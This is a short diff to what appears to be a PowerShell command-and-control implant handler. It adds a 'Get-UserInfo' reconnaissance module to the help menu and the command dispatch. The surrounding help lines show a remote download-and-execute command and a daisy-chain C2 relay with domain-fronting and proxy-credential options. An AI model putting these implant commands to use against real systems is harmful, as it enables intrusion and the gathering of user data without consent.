@@ -457,6 +457,7 @@ $header = '
         write-host " ModulesLoaded " -ForegroundColor Green 
         write-host " LoadModule <modulename>" -ForegroundColor Green 
         write-host " LoadModule Inveigh.ps1" -ForegroundColor Green
+        write-host " Get-UserInfo" -ForegroundColor Green
         write-host " Invoke-Expression (Get-Webclient).DownloadString(`"https://module.ps1`")" -ForegroundColor Green
         write-host " StartAnotherImplant or SAI" -ForegroundColor Green 
         write-host " Invoke-DaisyChain -name dc1daisy -daisyserver http://192.168.1.1 -port 80 -c2port 80 -c2server http://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\test -proxypassword pass" -ForegroundColor Green
@@ -1802,6 +1803,10 @@ param
             if ($pscommand.tolower().startswith('get-computerinfo'))
             {
                 CheckModuleLoaded "Get-ComputerInfo.ps1" $psrandomuri
+            }
+            if ($pscommand.tolower().startswith('get-userinfo'))
+            {
+                CheckModuleLoaded "Get-UserInfo.ps1" $psrandomuri
             }
             if ($pscommand.tolower().startswith('sharpsocks'))
             {
